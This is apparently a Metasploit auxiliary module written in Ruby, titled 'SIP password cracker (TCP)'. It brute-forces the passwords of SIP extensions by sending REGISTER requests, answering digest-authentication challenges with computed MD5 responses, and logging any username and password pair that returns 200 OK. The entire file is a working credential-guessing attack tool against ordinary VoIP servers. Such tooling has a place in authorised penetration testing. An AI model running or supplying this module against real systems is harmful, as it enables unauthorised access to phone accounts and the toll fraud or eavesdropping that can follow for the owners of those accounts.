require 'msf/core'


class Metasploit3 < Msf::Auxiliary

    include Msf::Exploit::Remote::Tcp
    include Msf::Auxiliary::Report
    include Msf::Auxiliary::Scanner
    include Msf::Auxiliary::AuthBrute

    def initialize
        super(
            'Name'			=>  'SIP password cracker (TCP)',
            'Version'		=>  '$Revision: 0 $',
            'Description'	=>  'This module tries to bruteforce the password of a known extension',
            'Author'		=>  'Jesus Perez <jesus.perez[at]quobis.com>',
            'License'		=>  MSF_LICENSE
        )

        register_options(
        [
            OptAddress.new('EXTIP', [false, 'External ip address (else local)']),
            Opt::CPORT(5065),
            Opt::CHOST,
            Opt::RPORT(5060)
		], self.class)
    end

    def rport
        datastore['RPORT'].to_i
    end

    def lport
        datastore['CPORT'].to_i
    end

    def extip
        datastore['EXTIP'] || Rex::Socket.source_address(datastore['RHOSTS'])
    end

    # Operate on a single system at a time
    def run_host(ip)
        begin
            meth = "REGISTER"
            # Do it for selected combinations
            each_user_pass { |user, pass|

                connect

                # Initial REGISTER request
                cseq = 1
                call_id = "%.16x" % rand(0x10000000000000000)
                data = create_request(meth, user, nil, ip, nil, cseq, call_id)
                sock.put(data)

                # Get SIP digest challenge, resolve and send it
                res = sock.get_once(-1, 5)
                data = resolve_challenge(res, meth, user, pass, cseq+1, call_id) if res
                sock.put(data)

                # Receive and parse final response
                res = sock.get_once(-1, 5)
                parse_reply(res, ip, user, pass)
        }
        rescue ::Interrupt
            raise $!
        ensure
            disconnect
        end
    end

    # SIP digest calculator
    def get_digest(username, realm, pwd, nonce, meth)
        ha1 = Digest::MD5.hexdigest("#{username}:#{realm}:#{pwd}")
        ha2 = Digest::MD5.hexdigest("#{meth}:sip:#{realm}")
        response = Digest::MD5.hexdigest("#{ha1}:#{nonce}:#{ha2}")
    end

    # SIP requests creator
    def create_request(meth, ext, pass, realm, nonce, cseq, call_id)
        from_tag = "%.8x" % rand(0x100000000)
        branch_pad = "%.7x" % rand(0x10000000)
        uri = "sip:#{ext}@#{realm}"
        target_uri = "sip:#{realm}"

        data  = "#{meth} #{target_uri} SIP/2.0\r\n"
        data << "Via: SIP/2.0/TCP #{extip}:#{lport};branch=z9hG4bK#{branch_pad}\r\n"
        data << "Max-Forwards: 70\r\n"
        data << "From: #{ext} <#{uri}>;tag=#{from_tag}\r\n"
        data << "To: #{ext} <#{uri}>\r\n"
        data << "Call-ID: #{call_id}@#{realm}\r\n"
        data << "CSeq: #{cseq} #{meth}\r\n"
        data << "Contact: <#{uri}>\r\n"
        if !(nonce == nil)
            response = get_digest(ext, realm, pass, nonce, meth)
            data << "Authorization: Digest username=\"#{ext}\","
            data << "realm=\"#{realm}\", nonce=\"#{nonce}\", opaque=\"\","
            data << "uri=\"#{target_uri}\", response= \"#{response}\"\r\n"
        end
        data << "Content-Length: 0\r\n"
        data << "\r\n"
    end

    # Register challenge resolver
    def resolve_challenge(pkt, meth, ext, pass, cseq, call_id)
        if(pkt[0] =~ /^WWW-Authenticate\:\s*(.*)$/i)
            realm, nonce = "#{$1.strip}".split(',')
            @prealm = realm.split('=')[1].chop[1..-1]
            pnonce = nonce.split('=')[1].chop[1..-1]
            data = create_request(meth, ext, pass, @prealm, pnonce, cseq, call_id)
        end
    end

    # Final response parser
    def parse_reply(pkt, ip, user, pass)
        resp  = pkt[0].split(/\s+/)[1]
        if resp.to_i == 200
            print_status("Found valid login: user = \"#{user}\" pass = \"#{pass}\" realm = \"#{@prealm}\"\n")
            auth_info = {
                :host        => ip,
                :port        => rport,
                :sname       => 'sip',
                :user        => user,
                :proof       => pass,
                :source_type => "user_supplied",
                :active      => true
            }
            report_auth_info(auth_info)
        end
    end

end
